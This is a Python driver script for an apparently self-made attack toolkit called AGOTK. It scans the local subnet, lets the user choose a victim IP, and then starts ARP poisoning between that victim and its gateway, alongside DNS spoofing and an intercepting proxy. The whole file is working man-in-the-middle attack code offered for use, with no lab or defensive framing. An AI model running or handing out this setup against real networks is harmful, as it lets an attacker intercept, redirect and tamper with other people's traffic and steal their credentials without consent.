from AGOTK.proxy import MyProxy
from AGOTK import ARPPoisoner, network_scanner
from AGOTK import DNSSpoofer
from AGOTK import ProxyServer
from scapy.all import *
import sys
import argparse
import inquirer

def main(argv) -> None:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=False, help='The interface to use')

    parser.add_argument('-t', '--target', type=str, required=False, help='The ip address of the target')
    parser.add_argument('-r', '--range', type=str, required=False, help='The ip range to scan over, alternative to --target')

    args = parser.parse_args()

    interface: str = ""

    if args.interface is None:
        # if no interface is given, then pick the default one
        interface = conf.iface
    else:
        interface = args.interface

    ip_target: str = ""

    if args.target is None:
        # no target is given so scan automatically over subnet {ip}/24
        if args.range is None:
            ip_range: str = get_if_addr(interface) + '/24'
        else:
            ip_range: str = args.range
            
        ip_addresses: List[str] = network_scanner.scan(interface, ip_range)

        questions = [
            inquirer.List('ip_address',
                        message="What is the ip address of the target?",
                        choices=ip_addresses)
        ]
        answers = inquirer.prompt(questions)
        ip_target = answers['ip_address']
    else:
        # target is given, so we do not scan automatically
        ip_target = args.target

    target_route: Route = conf.route.route(ip_target)
    ip_gateway: str = conf.route.route(target_route[2])[2]

    arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
    arp_poisoner.start()

    dns_spoofer: DNSSpoofer = DNSSpoofer(interface)
    dns_spoofer.start()

    proxy_server: ProxyServer = ProxyServer()
    proxy_server.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nExit...")
        arp_poisoner.stop()
        dns_spoofer.stop()
        proxy_server.stop()

if __name__ == "__main__":
    main(sys.argv[1:])
